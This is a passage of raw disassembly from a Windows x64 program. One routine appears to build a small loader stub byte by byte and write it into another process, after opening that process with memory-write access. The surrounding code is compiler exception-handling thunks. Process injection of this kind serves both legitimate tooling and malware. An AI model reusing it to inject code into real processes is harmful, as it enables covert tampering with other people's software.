   140006f1a:	89 01                	mov    %eax,(%rcx)
   140006f1c:	33 c0                	xor    %eax,%eax
   140006f1e:	e9 8e 02 00 00       	jmp    0x1400071b1
   140006f23:	e9 0f 02 00 00       	jmp    0x140007137
   140006f28:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f2c:	c6 44 04 38 48       	movb   $0x48,0x38(%rsp,%rax,1)
   140006f31:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f35:	ff c0                	inc    %eax
   140006f37:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f3b:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f3f:	c6 44 04 38 83       	movb   $0x83,0x38(%rsp,%rax,1)
   140006f44:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f48:	ff c0                	inc    %eax
   140006f4a:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f4e:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f52:	c6 44 04 38 ec       	movb   $0xec,0x38(%rsp,%rax,1)
   140006f57:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f5b:	ff c0                	inc    %eax
   140006f5d:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f61:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f65:	c6 44 04 38 28       	movb   $0x28,0x38(%rsp,%rax,1)
   140006f6a:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f6e:	ff c0                	inc    %eax
   140006f70:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f74:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f78:	c6 44 04 38 48       	movb   $0x48,0x38(%rsp,%rax,1)
   140006f7d:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f81:	ff c0                	inc    %eax
   140006f83:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f87:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f8b:	c6 44 04 38 8d       	movb   $0x8d,0x38(%rsp,%rax,1)
   140006f90:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f94:	ff c0                	inc    %eax
   140006f96:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006f9a:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006f9e:	c6 44 04 38 0d       	movb   $0xd,0x38(%rsp,%rax,1)
   140006fa3:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006fa7:	ff c0                	inc    %eax
   140006fa9:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006fad:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140006fb1:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140006fb5:	2b c8                	sub    %eax,%ecx
   140006fb7:	8b c1                	mov    %ecx,%eax
   140006fb9:	2b 44 24 58          	sub    0x58(%rsp),%eax
   140006fbd:	83 e8 04             	sub    $0x4,%eax
   140006fc0:	89 44 24 70          	mov    %eax,0x70(%rsp)
   140006fc4:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006fc8:	0f b6 4c 24 70       	movzbl 0x70(%rsp),%ecx
   140006fcd:	88 4c 04 38          	mov    %cl,0x38(%rsp,%rax,1)
   140006fd1:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006fd5:	ff c0                	inc    %eax
   140006fd7:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006fdb:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140006fdf:	c1 e8 08             	shr    $0x8,%eax
   140006fe2:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140006fe6:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   140006fea:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140006fee:	ff c0                	inc    %eax
   140006ff0:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140006ff4:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140006ff8:	c1 e8 10             	shr    $0x10,%eax
   140006ffb:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140006fff:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   140007003:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007007:	ff c0                	inc    %eax
   140007009:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000700d:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140007011:	c1 e8 18             	shr    $0x18,%eax
   140007014:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140007018:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   14000701c:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007020:	ff c0                	inc    %eax
   140007022:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007026:	8b 44 24 60          	mov    0x60(%rsp),%eax
   14000702a:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000702e:	2b c8                	sub    %eax,%ecx
   140007030:	8b c1                	mov    %ecx,%eax
   140007032:	2b 44 24 58          	sub    0x58(%rsp),%eax
   140007036:	83 e8 05             	sub    $0x5,%eax
   140007039:	89 44 24 74          	mov    %eax,0x74(%rsp)
   14000703d:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007041:	c6 44 04 38 e8       	movb   $0xe8,0x38(%rsp,%rax,1)
   140007046:	8b 44 24 58          	mov    0x58(%rsp),%eax
   14000704a:	ff c0                	inc    %eax
   14000704c:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007050:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007054:	0f b6 4c 24 74       	movzbl 0x74(%rsp),%ecx
   140007059:	88 4c 04 38          	mov    %cl,0x38(%rsp,%rax,1)
   14000705d:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007061:	ff c0                	inc    %eax
   140007063:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007067:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000706b:	c1 e8 08             	shr    $0x8,%eax
   14000706e:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   140007072:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   140007076:	8b 44 24 58          	mov    0x58(%rsp),%eax
   14000707a:	ff c0                	inc    %eax
   14000707c:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007080:	8b 44 24 74          	mov    0x74(%rsp),%eax
   140007084:	c1 e8 10             	shr    $0x10,%eax
   140007087:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   14000708b:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   14000708f:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007093:	ff c0                	inc    %eax
   140007095:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007099:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000709d:	c1 e8 18             	shr    $0x18,%eax
   1400070a0:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   1400070a4:	88 44 0c 38          	mov    %al,0x38(%rsp,%rcx,1)
   1400070a8:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070ac:	ff c0                	inc    %eax
   1400070ae:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400070b2:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070b6:	c6 44 04 38 33       	movb   $0x33,0x38(%rsp,%rax,1)
   1400070bb:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070bf:	ff c0                	inc    %eax
   1400070c1:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400070c5:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070c9:	c6 44 04 38 c0       	movb   $0xc0,0x38(%rsp,%rax,1)
   1400070ce:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070d2:	ff c0                	inc    %eax
   1400070d4:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400070d8:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070dc:	c6 44 04 38 48       	movb   $0x48,0x38(%rsp,%rax,1)
   1400070e1:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070e5:	ff c0                	inc    %eax
   1400070e7:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400070eb:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070ef:	c6 44 04 38 83       	movb   $0x83,0x38(%rsp,%rax,1)
   1400070f4:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1400070f8:	ff c0                	inc    %eax
   1400070fa:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400070fe:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007102:	c6 44 04 38 c4       	movb   $0xc4,0x38(%rsp,%rax,1)
   140007107:	8b 44 24 58          	mov    0x58(%rsp),%eax
   14000710b:	ff c0                	inc    %eax
   14000710d:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007111:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007115:	c6 44 04 38 28       	movb   $0x28,0x38(%rsp,%rax,1)
   14000711a:	8b 44 24 58          	mov    0x58(%rsp),%eax
   14000711e:	ff c0                	inc    %eax
   140007120:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007124:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007128:	c6 44 04 38 c3       	movb   $0xc3,0x38(%rsp,%rax,1)
   14000712d:	8b 44 24 58          	mov    0x58(%rsp),%eax
   140007131:	ff c0                	inc    %eax
   140007133:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140007137:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000713e:	00 00 
   140007140:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140007146:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000714b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140007150:	48 8b 0d 11 60 00 00 	mov    0x6011(%rip),%rcx        # 0x14000d168
   140007157:	ff 15 13 0f 00 00    	call   *0xf13(%rip)        # 0x140008070
   14000715d:	85 c0                	test   %eax,%eax
   14000715f:	75 14                	jne    0x140007175
   140007161:	ff 15 b9 0f 00 00    	call   *0xfb9(%rip)        # 0x140008120
   140007167:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   14000716e:	00 
   14000716f:	89 01                	mov    %eax,(%rcx)
   140007171:	33 c0                	xor    %eax,%eax
   140007173:	eb 3c                	jmp    0x1400071b1
   140007175:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   14000717c:	00 
   14000717d:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140007183:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140007188:	eb 27                	jmp    0x1400071b1
   14000718a:	eb 15                	jmp    0x1400071a1
   14000718c:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140007193:	00 
   140007194:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   14000719a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000719f:	eb 10                	jmp    0x1400071b1
   1400071a1:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   1400071a8:	00 
   1400071a9:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   1400071af:	33 c0                	xor    %eax,%eax
   1400071b1:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400071b8:	5f                   	pop    %rdi
   1400071b9:	c3                   	ret
   1400071ba:	cc                   	int3
   1400071bb:	cc                   	int3
   1400071bc:	cc                   	int3
   1400071bd:	cc                   	int3
   1400071be:	cc                   	int3
   1400071bf:	cc                   	int3
   1400071c0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400071c5:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400071c9:	48 83 ec 38          	sub    $0x38,%rsp
   1400071cd:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   1400071d2:	33 d2                	xor    %edx,%edx
   1400071d4:	b9 78 04 00 00       	mov    $0x478,%ecx
   1400071d9:	ff 15 71 0e 00 00    	call   *0xe71(%rip)        # 0x140008050
   1400071df:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400071e4:	48 83 7c 24 20 00    	cmpq   $0x0,0x20(%rsp)
   1400071ea:	75 1b                	jne    0x140007207
   1400071ec:	48 83 7c 24 48 00    	cmpq   $0x0,0x48(%rsp)
   1400071f2:	74 0d                	je     0x140007201
   1400071f4:	ff 15 26 0f 00 00    	call   *0xf26(%rip)        # 0x140008120
   1400071fa:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400071ff:	89 01                	mov    %eax,(%rcx)
   140007201:	33 c0                	xor    %eax,%eax
   140007203:	eb 1a                	jmp    0x14000721f
   140007205:	eb 18                	jmp    0x14000721f
   140007207:	48 83 7c 24 48 00    	cmpq   $0x0,0x48(%rsp)
   14000720d:	74 0b                	je     0x14000721a
   14000720f:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140007214:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   14000721a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000721f:	48 83 c4 38          	add    $0x38,%rsp
   140007223:	c3                   	ret
   140007224:	ff 25 de 10 00 00    	jmp    *0x10de(%rip)        # 0x140008308
   14000722a:	cc                   	int3
   14000722b:	cc                   	int3
   14000722c:	cc                   	int3
   14000722d:	cc                   	int3
   14000722e:	cc                   	int3
   14000722f:	cc                   	int3
   140007230:	40 55                	rex push %rbp
   140007232:	48 83 ec 20          	sub    $0x20,%rsp
   140007236:	48 8b ea             	mov    %rdx,%rbp
   140007239:	48 8b 01             	mov    (%rcx),%rax
   14000723c:	48 8b d1             	mov    %rcx,%rdx
   14000723f:	8b 08                	mov    (%rax),%ecx
   140007241:	e8 36 b8 ff ff       	call   0x140002a7c
   140007246:	90                   	nop
   140007247:	48 83 c4 20          	add    $0x20,%rsp
   14000724b:	5d                   	pop    %rbp
   14000724c:	c3                   	ret
   14000724d:	cc                   	int3
   14000724e:	40 55                	rex push %rbp
   140007250:	48 83 ec 20          	sub    $0x20,%rsp
   140007254:	48 8b ea             	mov    %rdx,%rbp
   140007257:	83 bd 80 00 00 00 00 	cmpl   $0x0,0x80(%rbp)
   14000725e:	74 0b                	je     0x14000726b
   140007260:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007265:	e8 ea c8 ff ff       	call   0x140003b54
   14000726a:	90                   	nop
   14000726b:	48 83 c4 20          	add    $0x20,%rsp
   14000726f:	5d                   	pop    %rbp
   140007270:	c3                   	ret
   140007271:	cc                   	int3
   140007272:	40 55                	rex push %rbp
   140007274:	48 83 ec 20          	sub    $0x20,%rsp
   140007278:	48 8b ea             	mov    %rdx,%rbp
   14000727b:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140007280:	e8 cf c8 ff ff       	call   0x140003b54
   140007285:	90                   	nop
   140007286:	48 83 c4 20          	add    $0x20,%rsp
   14000728a:	5d                   	pop    %rbp
   14000728b:	c3                   	ret
   14000728c:	cc                   	int3
   14000728d:	cc                   	int3
   14000728e:	cc                   	int3
   14000728f:	cc                   	int3
   140007290:	cc                   	int3
   140007291:	cc                   	int3
   140007292:	40 55                	rex push %rbp
   140007294:	48 83 ec 20          	sub    $0x20,%rsp
   140007298:	48 8b ea             	mov    %rdx,%rbp
   14000729b:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400072a0:	e8 af c8 ff ff       	call   0x140003b54
   1400072a5:	90                   	nop
   1400072a6:	48 83 c4 20          	add    $0x20,%rsp
   1400072aa:	5d                   	pop    %rbp
   1400072ab:	c3                   	ret
   1400072ac:	cc                   	int3
   1400072ad:	40 55                	rex push %rbp
   1400072af:	48 83 ec 20          	sub    $0x20,%rsp
   1400072b3:	48 8b ea             	mov    %rdx,%rbp
   1400072b6:	48 8b 0d c3 3f 00 00 	mov    0x3fc3(%rip),%rcx        # 0x14000b280
   1400072bd:	ff 15 6d 0f 00 00    	call   *0xf6d(%rip)        # 0x140008230
   1400072c3:	90                   	nop
   1400072c4:	48 83 c4 20          	add    $0x20,%rsp
   1400072c8:	5d                   	pop    %rbp
   1400072c9:	c3                   	ret
   1400072ca:	cc                   	int3
   1400072cb:	40 55                	rex push %rbp
   1400072cd:	48 83 ec 20          	sub    $0x20,%rsp
   1400072d1:	48 8b ea             	mov    %rdx,%rbp
   1400072d4:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400072d8:	74 08                	je     0x1400072e2
   1400072da:	33 c9                	xor    %ecx,%ecx
   1400072dc:	e8 73 c8 ff ff       	call   0x140003b54
   1400072e1:	90                   	nop
   1400072e2:	48 83 c4 20          	add    $0x20,%rsp
   1400072e6:	5d                   	pop    %rbp
   1400072e7:	c3                   	ret
   1400072e8:	cc                   	int3
   1400072e9:	40 55                	rex push %rbp
   1400072eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400072ef:	48 8b ea             	mov    %rdx,%rbp
   1400072f2:	e8 bd ae ff ff       	call   0x1400021b4
   1400072f7:	90                   	nop
   1400072f8:	48 83 c4 20          	add    $0x20,%rsp
   1400072fc:	5d                   	pop    %rbp
   1400072fd:	c3                   	ret
   1400072fe:	cc                   	int3
   1400072ff:	cc                   	int3
   140007300:	40 55                	rex push %rbp
   140007302:	48 83 ec 20          	sub    $0x20,%rsp
   140007306:	48 8b ea             	mov    %rdx,%rbp
   140007309:	48 8b 01             	mov    (%rcx),%rax
   14000730c:	33 c9                	xor    %ecx,%ecx
   14000730e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140007314:	0f 94 c1             	sete   %cl
   140007317:	8b c1                	mov    %ecx,%eax
   140007319:	8b c1                	mov    %ecx,%eax
   14000731b:	48 83 c4 20          	add    $0x20,%rsp
   14000731f:	5d                   	pop    %rbp
   140007320:	c3                   	ret
   140007321:	cc                   	int3
   140007322:	40 55                	rex push %rbp
   140007324:	48 83 ec 20          	sub    $0x20,%rsp
   140007328:	48 8b ea             	mov    %rdx,%rbp
   14000732b:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140007330:	e8 1f c8 ff ff       	call   0x140003b54
   140007335:	90                   	nop
   140007336:	48 83 c4 20          	add    $0x20,%rsp
   14000733a:	5d                   	pop    %rbp
   14000733b:	c3                   	ret
   14000733c:	cc                   	int3
   14000733d:	40 55                	rex push %rbp
   14000733f:	48 83 ec 20          	sub    $0x20,%rsp
   140007343:	48 8b ea             	mov    %rdx,%rbp
   140007346:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000734b:	e8 04 c8 ff ff       	call   0x140003b54
   140007350:	90                   	nop
   140007351:	48 83 c4 20          	add    $0x20,%rsp
   140007355:	5d                   	pop    %rbp
   140007356:	c3                   	ret
   140007357:	cc                   	int3
